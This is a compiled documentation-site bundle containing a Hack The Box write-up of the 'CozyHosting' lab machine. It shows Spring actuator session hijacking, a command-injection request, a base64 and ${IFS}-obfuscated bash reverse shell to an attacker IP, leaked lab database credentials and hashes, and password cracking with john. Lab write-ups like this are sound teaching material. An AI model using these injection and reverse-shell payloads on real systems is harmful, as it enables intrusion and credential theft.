"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[2209],{2475:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>d,frontMatter:()=>i,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Machines/easy/CozyHosting","title":"CozyHosting","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/Machines/easy/CozyHosting.md","sourceDirName":"Hacking/Write-ups/Hack the box/Machines/easy","slug":"/write-up/htb/machines/easy/cozy-hosting","permalink":"/docs/write-up/htb/machines/easy/cozy-hosting","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/machines/easy/cozy-hosting","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var o=s(4848),a=s(8453);const i={slug:"/write-up/htb/machines/easy/cozy-hosting",pagination_next:null,pagination_prev:null},r=void 0,c={},h=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function l(e){const n={a:"a",code:"code",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,o.jsx)(n.p,{children:"Initial scans shows exposed ports 22 and 80"}),"\n",(0,o.jsxs)(n.p,{children:["Looks like it's trying to redirect to ",(0,o.jsx)(n.code,{children:"http://cozyhosting.htb"}),". Let's add it to the ",(0,o.jsx)(n.code,{children:"/etc/hosts"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"curl -I cozyhosting.htb\nHTTP/1.1 200 \nServer: nginx/1.18.0 (Ubuntu)\nDate: Thu, 21 Sep 2023 19:13:45 GMT\nContent-Type: text/html;charset=UTF-8\nConnection: keep-alive\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 0\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\nPragma: no-cache\nExpires: 0\nX-Frame-Options: DENY\nContent-Language: en-US\n"})}),"\n",(0,o.jsx)(n.p,{children:"Let's try to explore the directories with gobuster and it could not find anything."}),"\n",(0,o.jsx)(n.p,{children:"Checking the headers, looks like the Content-Type is application/json, so probably there's an API behind"}),"\n",(0,o.jsxs)(n.p,{children:["Checking the error pages seems the one generated by Spring Framework. We can probe that by checking if it has the ",(0,o.jsx)(n.code,{children:"/actuator"})," endpoint public."]}),"\n",(0,o.jsx)(n.p,{children:"Probably the nginx server is acting as a proxy since the actuator returns localhost:8080 as the API address"}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"/actuator/sessions"})," returns interesting data:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'{"71555732BBE84C711A910118954B72C3":"kanderson","24BF9E9AC99A7F02F4006F36634DB3F1":"UNAUTHORIZED","3C47D6E35D00F4B01B7EF0EE5F3305FA":"UNAUTHORIZED","217ABE7CFC46C07AF69818945F9B702E":"kanderson"}\n'})}),"\n",(0,o.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,o.jsxs)(n.p,{children:["If we check the page, looks like there's a login page, if we change the ",(0,o.jsx)(n.code,{children:"JSESSIONID"})," cookie by the value in the ",(0,o.jsx)(n.code,{children:"/actuator/sessions"})," for user ",(0,o.jsx)(n.code,{children:"kanderson"}),", we'll be redirected to the ",(0,o.jsx)(n.code,{children:"/admin"})," page."]}),"\n",(0,o.jsxs)(n.p,{children:["Once we enter the admin page we see a form that if we send it will call the ",(0,o.jsx)(n.code,{children:"/executessh"})," endpoint ..."]}),"\n",(0,o.jsxs)(n.p,{children:["From the error, we could think that is calling the ssh command directly, so maybe this is vulnerable to command injection. We can try to get the output of ",(0,o.jsx)(n.code,{children:"id"})," command."]}),"\n",(0,o.jsx)(n.p,{children:"Looks like hostname is validated somehow, however with username we can break the command execution:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"curl -vvvvv 'http://cozyhosting.htb/executessh' -X POST \\\n-H 'Content-Type: application/x-www-form-urlencoded' \\\n-H 'Cookie: JSESSIONID=B762D32C36AE8003E582400AC70E4261' \\\n--data-raw 'host=localhost&username=`id`'\n"})}),"\n",(0,o.jsxs)(n.p,{children:["It's pretty hard to know how to make the command execution works, you need to try several combinations with ",(0,o.jsx)(n.code,{children:"\\`` and "}),";` and eventually got it working. Now let's open a reverse shell. In order to get the reverse shell, take into account that username cannot have spaces, a minimal validation is done."]}),"\n",(0,o.jsx)(n.p,{children:"To generate the payload that generates the reverse shell:"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:["Search a payload here: ",(0,o.jsx)(n.a,{href:"https://www.revshells.com/",children:"https://www.revshells.com/"})]}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"/bin/bash -i >& /dev/tcp/10.10.14.183/4444 0>&1\n"})}),"\n",(0,o.jsxs)(n.ol,{start:"2",children:["\n",(0,o.jsx)(n.li,{children:"Let's base64 it:"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'echo "bash -i >& /dev/tcp/10.10.14.183/4444 0>&1" | base64 -w 0\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg==\n'})}),"\n",(0,o.jsxs)(n.ol,{start:"3",children:["\n",(0,o.jsx)(n.li,{children:"Make the payload: echo the base64 payload, then base64 decode the payload and let bash run the payload:"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg== | base64 -d | bash\n"})}),"\n",(0,o.jsx)(n.p,{children:"You can run that payload and it should create a new connection to the listening nc"}),"\n",(0,o.jsxs)(n.ol,{start:"4",children:["\n",(0,o.jsx)(n.li,{children:"The endpoint don't link spaces, so let's replace it for the IFS character:"}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:'echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg=="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash'})}),"\n",(0,o.jsx)(n.p,{children:"However, if we try that payload, it will complain about whitespaces..."}),"\n",(0,o.jsxs)(n.ol,{start:"5",children:["\n",(0,o.jsx)(n.li,{children:"Do URL-encode and it will work"}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"Now we have foot-hold in the machine but without a relevant user"}),"\n",(0,o.jsx)(n.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,o.jsx)(n.p,{children:"if we do ls we can see a jarfile, let's download it. Searching inside the jar file, we see a promising thing, the configuration for the postgres database:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-conf",children:"spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting\nspring.datasource.username=postgres\nspring.datasource.password=Vg&nvzAQ7XxR\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"psql --user postgres --host localhost --port 5432 --password\n"})}),"\n",(0,o.jsx)(n.p,{children:"We can find the users database:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"   name    |                           password                           | role\n  \n-----------+--------------------------------------------------------------+-----\n--\n kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User\n admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi\nn\n"})}),"\n",(0,o.jsxs)(n.p,{children:["The password for ",(0,o.jsx)(n.code,{children:"kanderson"})," can be seen in the code and is ",(0,o.jsx)(n.code,{children:"MRdEQuv6~6P9"})]}),"\n",(0,o.jsxs)(n.p,{children:["Nothing seems to indicate the password for user ",(0,o.jsx)(n.code,{children:"josh"}),". Let's try to crack the password for admin with john the ripper:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"john exfil/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,o.jsxs)(n.p,{children:["With that password, we can now enter the ssh with user ",(0,o.jsx)(n.code,{children:"josh"})," and we are in and we can read the user flag."]}),"\n",(0,o.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"sudo -l"})," shows that the user ",(0,o.jsx)(n.code,{children:"josh"})," can run ssh with root privileges, let's check in GTFO bins how to use it to get root access."]})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>r});var t=s(6540);const o={},a=t.createContext(o);function i(e){const n=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);